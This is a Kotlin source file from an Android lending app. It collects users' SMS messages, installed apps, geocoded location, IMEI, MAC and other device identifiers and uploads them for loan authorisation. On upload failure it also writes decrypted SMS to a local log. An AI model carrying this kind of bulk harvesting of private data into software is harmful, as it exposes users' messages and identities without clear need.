package com.loan.icreditapp.collect

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.database.Cursor
import android.location.Address
import android.location.Geocoder
import android.provider.CallLog
import android.provider.ContactsContract
import android.text.TextUtils
import android.util.Log
import android.util.Pair
import com.alibaba.fastjson.JSON
import com.blankj.utilcode.util.*
import com.drojian.alpha.toolslib.log.LogSaver
import com.loan.icreditapp.BuildConfig
import com.loan.icreditapp.bean.auth.AuthResponseBean
import com.loan.icreditapp.collect.bean.CallRecordRequest
import com.loan.icreditapp.collect.bean.ContactRequest
import com.loan.icreditapp.collect.item.CollectAppInfoMgr
import com.loan.icreditapp.collect.item.CollectSmsMgr
import com.loan.icreditapp.global.Constant
import com.loan.icreditapp.util.BuildRequestJsonUtils
import com.loan.icreditapp.util.CheckResponseUtils
import com.loan.icreditapp.util.EncodeUtils
import com.loan.icreditapp.util.PatternUtils
import com.lzy.okgo.OkGo
import com.lzy.okgo.callback.StringCallback
import com.lzy.okgo.model.Response
import org.json.JSONObject
import java.io.UnsupportedEncodingException
import java.net.URLEncoder
import java.text.SimpleDateFormat
import java.util.*

abstract class BaseCollectDataMgr {

    companion object {
        private val YMDHMS_FORMAT = "HH:mm, MMMM dd, yyyy"
        fun local2UTC(timeStamp: Long): String? {
            val sdf =
                SimpleDateFormat(YMDHMS_FORMAT)
            sdf.timeZone = TimeZone.getTimeZone("UTC")
            return sdf.format(Date(timeStamp))
        }

        fun encodeData(s: String): String? {
            if (StringUtils.isEmpty(s)) {
                return null
            }
            val s1 =
                s.replace("%".toRegex(), "").replace("\\+".toRegex(), "").replace("\"".toRegex(), "")
                    .replace("'".toRegex(), "").replace("\\\\".toRegex(), "")
            try {
                var resultStr = PatternUtils.filterEmoji(s1)
                return URLEncoder.encode(resultStr, "utf-8")
            } catch (e: UnsupportedEncodingException) {
                e.printStackTrace()
            }
            return null
        }

        fun encodeData1(s: String?): String? {
            if (StringUtils.isEmpty(s)) {
                return null
            }
            val s1 =
                s!!.replace("%".toRegex(), "").replace("\\+".toRegex(), "").replace("\"".toRegex(), "")
                    .replace("'".toRegex(), "").replace("\\\\".toRegex(), "")
            try {
                var resultStr = PatternUtils.filterEmoji(s1)
                return resultStr
            } catch (e: UnsupportedEncodingException) {
                e.printStackTrace()
            }
            return null
        }
    }

    fun collectAuthData(orderId: String, observer: Observer?) {
        var startMillions = System.currentTimeMillis()
        ThreadUtils.executeByCached(object : ThreadUtils.SimpleTask<Exception?>() {
            @Throws(Throwable::class)
            override fun doInBackground(): Exception? {
                try {
                    val duration = (System.currentTimeMillis() - startMillions)
                    logFile(" start collect data start allo thread = " + duration)
                    startMillions = System.currentTimeMillis()
                    val aesSmsStr = CollectSmsMgr.sInstance.getSmsAesStr()
                    val duration1 = (System.currentTimeMillis() - startMillions)
                    logFile(" read sms duration = " + duration1 + " size = " + aesSmsStr.length)

//                        EncodeUtils.encryptAES(GsonUtils.toJson(readCallRecord(context)))
                    val callRecordStr = ""
//                    val originContract = GsonUtils.toJson(readContract(context))
//                    val tempContract = EncodeUtils.encryptAES(originContract)
                    val contractStr = ""

                    startMillions = System.currentTimeMillis()

                    val duration3 = (System.currentTimeMillis() - startMillions)
                    val aesAppInfoStr = CollectAppInfoMgr.sInstance.getAppInfoAesStr()
                    logFile(" read app info duration = " + duration3)
                    var locationBeanStr = ""
                    val locationStr = getLocation()
                    if (!TextUtils.isEmpty(locationStr)){
                        if (BuildConfig.DEBUG) {
                            Log.e("Test", locationStr)
                        }
                        locationBeanStr = EncodeUtils.encryptAES(locationStr)
                    }
                    val jsonObject = buildRequestJsonObj(
                        aesSmsStr, callRecordStr, contractStr,
                        aesAppInfoStr, locationBeanStr, orderId,
                    )
                    getAuthData(jsonObject, observer)
                } catch (e: Exception) {
                    if (BuildConfig.DEBUG) {
                        throw e
                    }
                    return e
                }
                return null
            }


            override fun onSuccess(result: Exception?) {
                if (result != null){
                    observer?.failure("collect data exception = " + result.toString())
                }
            }

        })
    }

    private fun getLocation() :String {
        var pair : Pair<Double, Double> = LocationMgr.getInstance().getLocationInfo()
        if ((pair.first.equals(0)) || (pair.second.equals(0))) {
            return ""
        }
        try {
            val gc = Geocoder(Utils.getApp(), Locale.getDefault())
            val list : List<Address> = gc.getFromLocation(pair.second, pair.first, 1)
            if (list != null && list.isNotEmpty()) {
                return JSON.toJSON(list[0]).toString()
            }
        } catch ( e : Exception) {
            if (BuildConfig.DEBUG) {
                Log.e("Test", "GPS get = ", e)
            }
            LogSaver.logToFile(" get gps failure = " + e.toString())
        }
        return ""
    }

    @SuppressLint("MissingPermission")
    private fun buildRequestJsonObj(
        smsStr: String, callRecordStr: String,
        contractStr: String, appListStr: String,
        locationStr: String, orderId: String
    ): JSONObject {
        val jsonObject: JSONObject = BuildRequestJsonUtils.buildRequestJson()
        try {
            jsonObject.put("accountId", Constant.mAccountId)
            //申请订单ID
            jsonObject.put("orderId", orderId)
            //通讯录json
            jsonObject.put("contacts", contractStr)
            //短信记录json
            jsonObject.put("sms", if (TextUtils.isEmpty(smsStr)) "" else smsStr)
            //通话记录json
            jsonObject.put("call", callRecordStr)
            //app安装列表json
            jsonObject.put("appList", appListStr)
            //GPS位置json
            jsonObject.put("gps", locationStr)
            //网络IP
            jsonObject.put("userIp", NetworkUtils.getIPAddress(true))
            //公网IP
            jsonObject.put("pubIp", NetworkUtils.getIpAddressByWifi())
            //手机IMEI
            try {
                val hasPermissionReadPhoneState =
                    PermissionUtils.isGranted(Manifest.permission.READ_PHONE_STATE)
                if (hasPermissionReadPhoneState) {
                    val imei = PhoneUtils.getIMEI()
                    jsonObject.put("imei", if (!TextUtils.isEmpty(imei)) imei else
                        DeviceUtils.getAndroidID())
                }
            } catch (e :Exception){

            }
            //androidId
            jsonObject.put("androidId", DeviceUtils.getAndroidID())
            jsonObject.put("deviceUniqId", DeviceUtils.getUniqueDeviceId())
            jsonObject.put("mac", DeviceUtils.getMacAddress())
            //手机品牌型号
            jsonObject.put("brand", DeviceUtils.getManufacturer())
            jsonObject.put("innerVersionCode", AppUtils.getAppVersionCode())
            jsonObject.put("isRooted", if (DeviceUtils.isDeviceRooted()) 1 else 0)
            jsonObject.put("isEmulator", if (DeviceUtils.isEmulator()) 1 else 0)
        } catch (e: java.lang.Exception) {
            e.printStackTrace()
            if (BuildConfig.DEBUG) {
                throw e
            }
        }
        return jsonObject
    }

    @SuppressLint("MissingPermission")
    private fun getAuthData(
        jsonObject: JSONObject, observer: Observer?) {
        logFile(" start upload auth .")
        val startMillions = System.currentTimeMillis()
        OkGo.post<String>(getApi()).tag(getTag()).upJson(jsonObject)
            .execute(object : StringCallback() {
                override fun onSuccess(response: Response<String>) {
//                        Log.i(TAG, " response success= " + response.body());
                    logFile(" start upload auth success =  " + (System.currentTimeMillis() - startMillions))
                    val authBean: AuthResponseBean? = CheckResponseUtils.checkResponseSuccess(
                        response,
                        AuthResponseBean::class.java
                    )
                    if (authBean != null && authBean.hasUpload == true) {
                        observer?.success(response)
//                        log2File(originSms, originContract, originAppInfo, "")
                    } else {
                        var errorMsg: String? = null
                        try {
                            errorMsg = GsonUtils.toJson(authBean)
                        } catch (e: Exception) {

                        }
                        observer?.failure(errorMsg)
                        log2File(jsonObject, errorMsg)
                    }
                }

                override fun onError(response: Response<String>) {
                    super.onError(response)
                    var errorMsg: String? = null
                    try {
                        errorMsg = response.body().toString()
                    } catch (e: Exception) {

                    }
                    observer?.failure(errorMsg)
                    logFile("start upload auth failure =  " + (System.currentTimeMillis() - startMillions) + errorMsg)
                }
            })
    }

    private fun log2File(
        jsonObject: JSONObject,
        errorMsg: String?
    ) {
        var originSms : String? = ""
        var originAppInfo : String? = ""

        val aesSmsStr = jsonObject.optString("sms")
        if (!TextUtils.isEmpty(aesSmsStr)){
            originSms = EncodeUtils.decryptAES(aesSmsStr)
        }
        val aesAppListStr = jsonObject.optString("appList")
        if (!TextUtils.isEmpty(aesAppListStr)){
            originAppInfo = EncodeUtils.decryptAES(aesAppListStr)
        }

        val sb = StringBuffer()
        if (!TextUtils.isEmpty(originSms)) {
            sb.append("  sms: ").append(originSms)
        }
        if (!TextUtils.isEmpty(originAppInfo)) {
            sb.append("  appinfo: ").append(originAppInfo)
        }
        if (!TextUtils.isEmpty(errorMsg)) {
            sb.append("  errorMsg: ").append(errorMsg)
        }
        if (!TextUtils.isEmpty(sb.toString())){
            LogSaver.logToFile(sb.toString())
        }
    }

    fun logFile(str : String){
        if (BuildConfig.DEBUG) {
            Log.e("Test", str)
        }
        LogSaver.logToFile(getLogTag() + " " + str)
    }

    private fun getHardwareData() {

    }

    fun onDestroy(){
        OkGo.getInstance().cancelTag(getTag())
    }

    interface Observer {
        fun success(response: Response<String>?)
        fun failure(response: String?)
    }

    private fun readCallRecord(context: Context): ArrayList<CallRecordRequest> {
        val callRecordList = ArrayList<CallRecordRequest>()
        val cr = context.contentResolver
        val uri = CallLog.Calls.CONTENT_URI
        val projection = arrayOf(
            CallLog.Calls.NUMBER, CallLog.Calls.DATE,
            CallLog.Calls.TYPE
        )
        var cursor: Cursor? = null
        try {
            cursor = cr.query(uri, projection, null, null, null)
            while (cursor!!.moveToNext()) {
                val number = cursor.getString(0)
                val date = cursor.getLong(1)
                val type = cursor.getInt(2)
                callRecordList.add(CallRecordRequest(number, date, type))
            }
        } catch (e: Exception) {
            e.printStackTrace()
            Log.e(getTag(), "read cardCord exception = $e")
        } finally {
            cursor?.close()
        }
        return callRecordList
    }

    @SuppressLint("Range")
    private fun readContract(context: Context): ArrayList<ContactRequest>? {
        //调用并获取联系人信息
        var cursor: Cursor? = null
        val list: ArrayList<ContactRequest> = ArrayList<ContactRequest>()
        try {
            cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    val id =
                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone._ID))
                    val displayName =
                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    var number =
                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    val lastUpdateTime =
                        cursor.getLong(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP))
                    //                    Log.e(TAG, " photo = " + photoUri + "  ringtone = " + ringtone + " look = " + lookupUri);
                    val contactRequest = ContactRequest()
                    contactRequest.name = encodeData1(displayName)
                    if (!TextUtils.isEmpty(number)) {
                        number = number.replace("-".toRegex(), " ")
                        // 空格去掉  为什么不直接-替换成"" 因为测试的时候发现还是会有空格 只能这么处理
                        number = number.replace(" ".toRegex(), "")
                        contactRequest.number = encodeData(number)
                    }
                    contactRequest.lastUpdate = lastUpdateTime
                    list.add(contactRequest)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
            Log.e(getTag(), " exception = $e")
        } finally {
            cursor?.close()
        }
        return list
    }

    abstract fun getTag() : String

    abstract fun getLogTag() : String

    abstract fun getApi() : String
}